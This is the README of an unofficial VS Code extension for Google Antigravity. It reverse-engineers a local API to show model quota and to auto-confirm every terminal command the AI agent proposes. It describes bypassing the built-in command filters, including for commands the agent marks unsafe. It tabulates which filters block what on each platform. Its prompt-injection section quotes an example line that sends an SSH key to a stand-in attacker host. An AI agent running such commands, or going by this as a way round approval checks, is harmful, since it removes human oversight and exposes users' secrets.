# AYesMan ⚡

![Visual Studio Marketplace Version](https://img.shields.io/visual-studio-marketplace/v/harry18456.ayesman?style=flat-square&label=version&color=007acc)
![Visual Studio Marketplace Installs](https://img.shields.io/visual-studio-marketplace/i/harry18456.ayesman?style=flat-square&color=4c1)
![GitHub License](https://img.shields.io/github/license/harry18456/AYesMen?style=flat-square&color=blue)
![GitHub stars](https://img.shields.io/github/stars/harry18456/AYesMen?style=flat-square)

An unofficial VS Code extension for Google Antigravity that adds a real-time quota dashboard and automatic agent step acceptance.

> ⚠️ **Disclaimer**: This is an unofficial tool. It works by reverse-engineering Antigravity's internal language server API. See [Risks](#risks) before use.

**[中文說明 → README.zh-tw.md](README.zh-tw.md)**

---

## Features

### ⚡ Unified Status Bar

A single status bar item combines both features.

- **Active**: `$(debug-start) YesMan` — auto-accept is running
- **Paused**: `$(debug-pause) YesMan` — auto-accept is off (orange background)
- **Click**: toggle auto-accept on/off
- **Hover**: quota breakdown for all models with percentages and reset timers
- **Background color**: yellow (<40%) or red (<20%) when quota is critically low (auto-accept ON only)

### 📊 Quota Dashboard

Antigravity's built-in UI hides model quota percentages. AYesMan surfaces them on hover.

- **Hover tooltip**: All models sorted alphabetically with 🟢/🟡/🔴 indicator, percentage, and reset countdown
- **Auto-refresh**: Every 2 minutes in the background
- **Manual refresh**: `Ctrl+Shift+P` → `AYesMan: Refresh Quota`

### ✅ Auto-Accept

Automatically confirms terminal commands proposed by the Antigravity Agent — no manual clicking required.

- **Toggle**: Click the `YesMan` status bar item or run `AYesMan: Toggle Auto-Accept` to pause/resume
- **No filter restrictions**: Unlike Antigravity's built-in Auto Run, accepts all commands including those with `|`, `;`, or blacklisted keywords
- **Multi-project safe**: Each extension instance only accepts steps from its own VS Code workspace
- **Default**: ON at activation

---

## How It Works

Both features share the same server discovery mechanism.

### 1. Server Discovery (runs once at startup, cached for 5 min)

Each Antigravity window has its own language server process. AYesMan identifies which one belongs to the current window using **parentPid matching**: Antigravity spawns the language server directly from the Extension Host process, so `language_server.parentPid === process.pid` uniquely identifies the right server without any network calls.

**Windows:**

```
PowerShell Get-CimInstance Win32_Process (language_server_windows_x64.exe)
  → extract PID, ParentProcessId, and --csrf_token
  → filter: keep only the process whose ParentProcessId = this Extension Host PID
  → netstat -ano to find listening ports for that PID
  → probe each port with a Heartbeat request (HTTP/HTTPS)
  → cache result: { port, csrfToken, useHttps }
```

**macOS / Linux:**

```
ps -eo pid,ppid,args | grep language_server
  → extract PID, PPID, and --csrf_token
  → filter: keep only the process whose PPID = this Extension Host PID
  → lsof -i -n -P -p <pid> | grep LISTEN → find listening port
  → probe each port with a Heartbeat request
  → cache result: { port, csrfToken, useHttps }
```

If no match is found by parentPid (e.g. platform doesn't expose PPID, or multi-window macOS issues), AYesMan falls back to **workspace mode**: it extracts the `--workspace_id` argument from the server's command-line arguments and matches it against the current VS Code workspace folders. This guarantees strict per-window session isolation even when process relationships are unreadable.

The CSRF token is stored in plaintext in the process's command-line arguments, accessible to any process running as the same user.

### 2. Quota Dashboard (every 2 minutes)

```
GetUserStatus          → plan info, prompt/flow credits, model quota fractions
GetCommandModelConfigs → autocomplete model quota
```

### 3. Auto-Accept (every 500ms, reads from cache)

The auto-accept loop only reads the already-cached server info — it never triggers discovery itself. Discovery is driven by the quota polling cycle.

```
GetAllCascadeTrajectories
  → sort by lastModifiedTime desc, prefer non-IDLE status, take top 3

GetCascadeTrajectorySteps { cascadeId, stepOffset: stepCount - 10 }
  → scan last 10 steps for a pending runCommand (not DONE or CANCELLED)

HandleCascadeUserInteraction { cascadeId, interaction: { runCommand: { confirm: true } } }
  → confirms the step using the cascade's own trajectoryId
```

### Per-Window State

Auto-accept state (`ON` / `OFF`) is stored **in-memory** inside each window's Extension Host process — it is not written to VS Code settings. This means:

- Each Antigravity window has its own independent auto-accept toggle
- Toggling in Window A has no effect on Window B
- Every new window starts with auto-accept **ON** by default (no configuration needed)

### Why not use `vscode.commands.executeCommand`?

`antigravity.agent.acceptAgentStep` internally calls `HandleCascadeUserInteraction` via gRPC, which requires a `cascade_id` that is only available inside the workbench's internal state — not accessible from an extension. Direct gRPC is the only viable path.

Other rejected approaches:

- **Webview DOM injection**: Antigravity's chat panel is a native workbench component, not a standard VS Code Webview — injected scripts never execute
- **Keyboard simulation (`Alt+Enter`)**: No reliable way to detect when the agent is waiting; blind sending interferes with normal typing

---

## Risks

### Quota Dashboard

**Risk: Very low.**

All calls are made locally to a server running on your own machine. The data read is your own account quota — equivalent to inspecting your own network traffic in DevTools. Nothing is sent to external servers beyond what Antigravity already sends.

### Auto-Accept

**Risk: Low, but worth understanding.**

| Concern          | Assessment                                                                                                                                                                                                                                            |
| ---------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Terms of Service | Using undocumented private APIs may technically violate ToS. Antigravity's ToS has not been audited for this.                                                                                                                                         |
| Detection        | All API calls originate from `127.0.0.1` with a valid CSRF token, indistinguishable from normal IDE activity. The 500ms polling interval could theoretically be flagged by server-side anomaly detection, though no such mechanism has been observed. |
| Account action   | No known cases of enforcement. Community extensions doing similar automation (e.g. via `executeCommand`) have existed since Antigravity launched without action.                                                                                      |
| API stability    | Undocumented APIs can change or be removed at any time. The extension will silently fail rather than crash if a call fails.                                                                                                                           |

**What this tool does NOT do:**

- It does not bypass any quota or usage limits
- It does not increase API consumption (it only confirms steps the user would confirm manually)
- It does not exfiltrate any data

### Prompt Injection

**Risk: Real. Understand before use.**

Antigravity's built-in Auto Run deliberately blocks commands containing `|`, `;`, or certain blacklisted keywords. AYesMan bypasses these filters entirely — it accepts whatever the agent proposes.

This creates a **prompt injection** attack surface:

1. Agent reads content from an untrusted source (a malicious repo's README, a crafted config file, user-supplied text)
2. That content contains embedded instructions that cause the agent to propose a dangerous command (e.g. `cat ~/.ssh/id_rsa | curl attacker.com`)
3. Official Auto Run: **blocked** (pipe operator)
4. AYesMan: **auto-confirmed**, command executes

**Mitigations:**

- Pause auto-accept when working with untrusted repos or files (`$(debug-pause) YesMan` in the status bar)
- Review what the agent is reading before letting it run commands in sensitive environments
- AYesMan is best suited for trusted, known codebases where you control the inputs

---

## Limitations

Currently, AYesMan has the following known limitations:

1. **Outside Workspace Files**: Prompts to read files outside the current VS Code workspace will not be auto-accepted.
2. **Ignored Files**: Prompts to read files matched by `.gitignore` will not be auto-accepted (Antigravity has a built-in feature to allow this).
3. **Browser Automation**: Browser injected executions and operations will not be auto-accepted.
4. **Fragility**: This extension relies heavily on undocumented internal APIs and is highly likely to break after any Antigravity update.
5. **Platform Utility**: This extension is currently most useful for **Windows users**, as Antigravity's built-in Auto Run feature struggles with chained commands on Windows (see [Findings: Antigravity Terminal Auto Run Limitations](#findings-antigravity-terminal-auto-run-limitations) below).

---

## Findings: Antigravity Terminal Auto Run Limitations

Even with Antigravity's built-in Auto Run enabled, its internal filtering mechanism exhibits **drastically different design logic and blind spots** across operating systems.

### macOS vs Windows Interception Rules

| Command Category / Operators                            | macOS (zsh) | Windows (PowerShell) |
| ------------------------------------------------------- | ----------- | -------------------- |
| **Pipe `\|`**                                           | ✅ Allowed  | ❌ Blocked           |
| **Semicolon `;`**                                       | ✅ Allowed  | ❌ Blocked           |
| **AND `&&`**                                            | ✅ Allowed  | ❌ Blocked           |
| **Redirect `>`**                                        | ✅ Allowed  | ❌ Blocked           |
| **`rmdir`**                                             | ❌ Blocked  | ❌ Blocked           |
| **Dangerous commands** (`rm -rf`, `sudo`, `chmod` etc.) | ✅ Allowed  | ✅ Allowed           |
| **General commands** (`mkdir`, `curl`, `git` etc.)      | ✅ Allowed  | ✅ Allowed           |

### Key Discoveries

1. **Windows focuses on syntax chaining prevention**: The Windows version strictly blocks all special characters (`|`, `;`, `&&`, `>`), meaning chained or complex commands are highly likely to be interrupted. However, it rarely filters destructive commands themselves (e.g., `rm`).
2. **macOS is extremely permissive**: Almost all commands containing special characters and destructive actions are allowed by default.
3. **Bizarre blind spots**: The only command consistently blocked on both platforms is `rmdir`, while the much more destructive `rm` (including recursive/force flags) is allowed through.

**AYesMan's core value across platforms:**

- **On Windows**: Bypasses the frequent popups and interruptions caused by special characters, allowing the Agent to smoothly execute chained or complex commands automatically.
- **On macOS**: Handles extreme edge cases (like `rmdir`) and ensures commands proactively marked as unsafe (`SafeToAutoRun: false`) by the Agent can still be auto-confirmed, achieving a truly unattended workflow.

---

## Installation

### Option A: Install from VSIX (recommended)

**1. Package**

```bash
cd ayesman
npm install
npx vsce package
# produces ayesman-1.4.6.vsix
```

**2. Install**

In Antigravity: `Ctrl+Shift+P` → `Extensions: Install from VSIX...` → select `ayesman-1.4.6.vsix`

---

### Option C: Publish to Open VSX

```bash
cd ayesman
npx ovsx publish ayesman-1.4.6.vsix -p <YOUR_TOKEN>
```

---

### Option D: Deploy from source (developer mode)

**1. Build**

```bash
cd ayesman
npm install
npm run compile
```

**2. Deploy to Antigravity**

```powershell
$dest = "$env:USERPROFILE\.antigravity\extensions\ayesmen.ayesman-1.4.6"

# Remove old version if present
if (Test-Path $dest) { Remove-Item $dest -Recurse -Force }

# Copy built extension
Copy-Item -Recurse ".\ayesman" $dest
```

**3. Reload**

In Antigravity: `Ctrl+Shift+P` → `Developer: Reload Window`

---

## Support

☕ Buy me a coffee: [harry18456](https://www.buymeacoffee.com/harry18456)

---

## License

MIT. This tool is for personal research and developer experience improvement only. Use at your own risk.
